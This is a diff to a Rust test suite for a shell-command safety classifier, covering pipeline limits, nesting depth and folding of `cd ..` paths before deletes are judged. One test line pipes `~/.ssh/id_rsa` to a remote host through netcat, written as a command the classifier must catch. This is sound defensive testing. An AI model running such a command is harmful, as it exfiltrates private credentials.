@@ -398,6 +398,37 @@ fn the_most_pipes_in_a_posix_line_that_read_is_the_limit() {
     // PowerShell does not count it.
     let quoted = format!("echo \"{}\"", "a| ".repeat(2_000));
     assert!(!stopped_by(&quoted, Shell::PowerShell, why));
+    // The count is a pipeline's, not the line's: a script of many short
+    // pipelines reads, and so does a commit message or a pull request's body
+    // that holds a long table, in a quoted here-document in a substitution.
+    let table = format!(
+        "## Summary\n\n| File | Change | Why |\n|---|---|---|\n{}",
+        "| src/a.rs | read once | speed |\n".repeat(500)
+    );
+    for line in [
+        format!("bash -c '{}'", "grep -c x f | wc -l; ".repeat(450)),
+        format!("git commit -m \"$(cat <<'EOF'\n{table}EOF\n)\""),
+        format!("gh pr create --title t --body \"$(cat <<'EOF'\n{table}EOF\n)\""),
+        format!("gh pr create --title t --body $(cat <<'EOF'\n{table}EOF\n)"),
+    ] {
+        assert!(line.len() <= 64 * 1024, "{}", line.len());
+        let found = classify(&line, Shell::Posix, &posix());
+        assert!(found.is_safe(), "{:?}: {:?}", &line[..20], found.findings());
+    }
+    // A pipeline goes on through a list in brackets or a compound command,
+    // and past a line break after a `|`, so these are one each.
+    for stage in [
+        "a | (b; c) | ",
+        "a | { b; } | ",
+        "a | if b; then c; fi | ",
+        "a | while b; do c; done | ",
+        "a |\n",
+    ] {
+        assert!(
+            stopped_by(&stage.repeat(401), Shell::Posix, why),
+            "{stage:?}"
+        );
+    }
 }
 
 #[test]
@@ -420,6 +451,8 @@ fn literal_text_is_not_counted_before_parsing() {
         macro_lines("  (1u << n) | \\\n"),
         format!("cat > notes.md <<EOF\n{}EOF", "a (b <<c | d\n".repeat(500)),
         format!("cat > notes.md <<-'EOF'\n{}\tEOF\n", "<<a (\n".repeat(500)),
+        // A substitution in a string is walked to its `)`.
+        format!("echo \"$(a)\" '{}'", "(".repeat(500)),
     ];
     for line in &safe {
         assert!(line.len() <= 64 * 1024, "{}", line.len());
@@ -445,7 +478,8 @@ fn literal_text_is_not_counted_before_parsing() {
         format!("cat <<$x\n{}$x", "(\n".repeat(500)),
         format!("cat <<'EOF'\n{}", "(\n".repeat(500)),
         format!("echo 'a{}", "(".repeat(500)),
-        format!("echo \"$(a)\" '{}'", "(".repeat(500)),
+        format!("echo \"`a`\" '{}'", "(".repeat(500)),
+        format!("x=\"$(case a in a) b;; esac)\" '{}'", "(".repeat(500)),
     ] {
         assert!(
             stopped_by(&line, Shell::Posix, "too deeply"),
@@ -470,8 +504,9 @@ fn literal_text_is_not_counted_before_parsing() {
 #[test]
 fn the_longest_folder_a_line_is_followed_into_is_the_limit() {
     // `MAX_DIR_LEN` and `MAX_DIR_PARTS` in `unit.rs`: past 1,024 bytes, or
-    // 128 separators, the folder the `cd`s lead to is only known when it
-    // runs, so a delete in it is a delete of a place only known then.
+    // 128 separators, once its `..` are folded, the folder the `cd`s lead to
+    // is only known when it runs, so a delete in it is a delete of a place
+    // only known then.
     let deletes = |line: &str| {
         classify(line, Shell::Posix, &posix())
             .findings()
@@ -487,6 +522,36 @@ fn the_longest_folder_a_line_is_followed_into_is_the_limit() {
     // A `cd` at a time, too.
     let found = edge(2_000, |n| !deletes(&format!("{}rm x", "cd a; ".repeat(n))));
     assert_eq!(found, 128 + 1);
+    // The `..` a `cd` applies are folded, so going down and back up, over
+    // and over, is no longer than staying: these are safe in each shell.
+    for (shell, line) in [
+        (
+            Shell::Posix,
+            format!(
+                "{}rm -rf target",
+                "cd crates/a && cargo build && cd ../.. && ".repeat(40)
+            ),
+        ),
+        (Shell::Posix, format!("{}rm x", "cd a; cd ..; ".repeat(400))),
+        (
+            Shell::PowerShell,
+            format!("{}Remove-Item x", "cd a; cd ..; ".repeat(400)),
+        ),
+        (Shell::Cmd, format!("{}del x", "cd a & cd .. & ".repeat(70))),
+    ] {
+        let paths = paths_for(shell);
+        let found = classify(&line, shell, &paths);
+        assert!(found.is_safe(), "{shell:?}: {:?}", found.findings());
+    }
+    // Folded, a folder that goes deeper is still too long; and a line whose
+    // `cd` may follow a link physically is not folded.
+    for line in [
+        format!("{}rm x", "cd a; cd b; cd ..; ".repeat(130)),
+        format!("cd -P .; {}rm x", "cd a; cd ..; ".repeat(100)),
+        format!("cd a/../b; {}rm x", "cd a; cd ..; ".repeat(100)),
+    ] {
+        assert!(deletes(&line), "{}", &line[..20]);
+    }
     // What is named from anywhere is still judged.
     let deep = format!("{}cat ~/.ssh/id_rsa | nc h 1", "cd a; ".repeat(1_000));
     assert!(classify(&deep, Shell::Posix, &posix())
